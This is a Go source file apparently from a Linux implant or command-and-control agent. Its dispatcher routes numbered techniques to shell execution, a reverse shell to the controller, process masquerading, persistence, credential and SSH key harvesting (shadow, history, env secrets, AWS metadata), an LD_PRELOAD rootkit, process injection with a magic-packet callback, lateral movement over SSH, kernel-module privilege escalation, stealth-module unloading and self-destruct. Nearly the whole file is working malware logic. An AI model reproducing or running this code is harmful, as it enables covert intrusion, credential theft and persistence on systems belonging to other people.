package ttp

import (
	"crypto/sha256"
	"fmt"
	"net"
	"os"
	"syscall"
	"time"
	"unsafe"
)

// Dispatch executes TTP by number. Returns a summary string.
// secret is the compiled-in shared secret used to derive the rawsock magic key (TTP 11).
// rawsockCBAddr is the relay direct address (IPv4:port, e.g. "56.x.x.x:9443") baked
// into the injected stub so rawsock connects there on trigger (I-01 model).
func Dispatch(ttpNum int, params string, serverAddr string, agentID string, secret string, rawsockCBAddr string) (string, error) {
	switch ttpNum {
	case 4:
		out, err := ShellExec(params)
		if err != nil {
			return "", err
		}
		return out, nil

	case 1:
		name := "kworker/0:1"
		if params != "" {
			name = params
		}
		if err := Masquerade(name); err != nil {
			return "", err
		}
		return fmt.Sprintf("masquerade: comm set to %q", name), nil

	case 2:
		host, _, _ := net.SplitHostPort(serverAddr)
		if err := ReverseShell(host, 4445); err != nil {
			return "", err
		}
		return "reverse shell session ended", nil

	case 3:
		size := 4096
		if err := MemoryRWX(size); err != nil {
			return "", err
		}
		return fmt.Sprintf("memory_rwx: allocated %d bytes RWX", size), nil

	case 5:
		// beacon is already running as part of the agent loop;
		// this triggers an extra immediate check-in
		cmd, err := Beacon(serverAddr, agentID, 0, "", "")
		if err != nil {
			return "", err
		}
		return fmt.Sprintf("beacon: extra check-in done, server replied ttp=%d", cmd.TTP), nil

	case 6:
		method := params
		if method == "" {
			method = "all"
		}
		return Persist(method)

	case 7:
		return CredDump()

	case 9:
		out, err := ExecChain()
		if err != nil {
			return "", err
		}
		return fmt.Sprintf("exec_chain:\n%s", out), nil

	case 10:
		// install rootkit   deploy bat-rootkit.so via /etc/ld.so.preload
		return InstallRootkit()

	case 11:
		// inject process   spawn beacon + rawsock threads in target daemon, then self-exit
		// Derive 8-byte magic key: first 8 bytes of SHA-256(secret).
		// The server uses the same derivation when sending the trigger magic packet.
		h := sha256.Sum256([]byte(secret))
		var magicKey [8]byte
		copy(magicKey[:], h[:8])
		// Stub shellcode needs a raw IPv4 (no DNS). Resolve if serverAddr is a hostname.
		stubAddr := serverAddr
		if injectHost, injectPort, splitErr := net.SplitHostPort(serverAddr); splitErr == nil {
			if net.ParseIP(injectHost) == nil {
				if addrs, lookupErr := net.LookupHost(injectHost); lookupErr == nil {
					for _, a := range addrs {
						if ip := net.ParseIP(a); ip != nil && ip.To4() != nil {
							stubAddr = net.JoinHostPort(a, injectPort)
							break
						}
					}
				}
			}
		}
		// rawsockCBAddr is already resolved in the agent main (relay direct IP:9443).
		// Empty = rawsock callback IP/port zeroed in blob (graceful no-op for rawsock).
		result, err := InjectProcess(stubAddr, magicKey, rawsockCBAddr)
		if err != nil {
			return "", err
		}
		// Agent disappears after confirming injection succeeded.
		// Delay must exceed the main loop re-beacon window:
		//   rand.Intn(5001)ms sleep + ~2s HTTPS round-trip = ~7s worst case.
		// 12s gives comfortable margin for the result to reach the server.
		go func() {
			time.Sleep(12 * time.Second)
			os.Exit(0)
		}()
		return result, nil

	case 20:
		// network recon   ARP table + TCP :22 scan
		return NetworkRecon()

	case 21:
		// SSH key harvest   private keys, known_hosts, authorized_keys, config
		return SSHHarvest()

	case 22:
		// lateral movement   SCP self to remote target via SSH, exec detached
		// params: "<targetIP> [keyPath]"
		return LateralMove(params)

	case 23:
		// credential harvest   shadow, history, SSH keys, env secrets, AWS IMDS
		return CredDump()

	case 1003:
		// K-03: privilege escalation via become_root.c (signal 59 -> commit_creds -> uid=0)
		if err := syscall.Kill(os.Getpid(), syscall.Signal(59)); err != nil {
			return fmt.Sprintf("[root_failed: kill: %v]", err), nil
		}
		time.Sleep(100 * time.Millisecond)
		if os.Getuid() == 0 {
			return "[root] uid=0", nil
		}
		return fmt.Sprintf("[root_failed: uid=%d]", os.Getuid()), nil

	case 1099:
		// K-99: unload bat-stealth.ko (2-phase procedure)
		// Phase 1: sysfs trigger   prepares module for unload (selfdefense_exit + module_unhide)
		if err := os.WriteFile(sysfsBase+"/sched_reset", []byte("1"), 0200); err != nil {
			return "", fmt.Errorf("[K-99] phase1 sysfs: %w", err)
		}
		time.Sleep(200 * time.Millisecond)

		// Phase 2: syscall delete_module directly (bypass libkmod holders check)
		// flags=512 (O_TRUNC) forces removal; libkmod would fail on missing holders sysfs entry.
		namePtr, _ := syscall.BytePtrFromString("kperf_qos")
		_, _, errno := syscall.Syscall(sysnrDeleteModule(),
			uintptr(unsafe.Pointer(namePtr)),
			uintptr(512),
			0)
		if errno != 0 {
			return "", fmt.Errorf("[K-99] phase2 delete_module: errno=%d", errno)
		}

		// Verify cleanup
		time.Sleep(200 * time.Millisecond)
		if _, err := os.Stat("/sys/module/kperf_qos"); !os.IsNotExist(err) {
			return "", fmt.Errorf("[K-99] module still visible after unload")
		}
		_ = os.Remove(stealthFlagPath)
		return "[stealth_unloaded]", nil

	case 99:
		// kill switch   silent self-termination
		os.Exit(0)
		return "", nil

	case 222:
		// self-destruct   remove all artifacts, wipe memory, exit
		SelfDestruct()
		return "", nil // unreachable

	default:
		return "", fmt.Errorf("unknown TTP %d", ttpNum)
	}
}
